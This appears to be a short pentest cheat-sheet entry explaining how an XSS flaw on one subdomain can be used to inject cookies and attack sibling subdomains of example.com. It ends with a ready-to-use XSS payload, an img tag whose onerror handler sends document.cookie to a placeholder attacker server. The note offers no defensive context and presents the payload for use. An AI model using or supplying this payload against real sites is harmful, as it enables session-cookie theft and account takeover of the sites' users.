# XSS via cookie

## XSS via cookie

NOT only GET and POST !

* [**b.example.com**](http://b.example.com/) **is vulnerable to XSS.**
* we can attack [A.example.com](http://a.example.com/) using cookie injection :

![](../../../../.gitbook/assets/6e3e55d168d24b8ca38bdb6d5814aab6.png)

and apply that on every subdomains linked to [example.com](http://example.com/) !

`<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>pl`

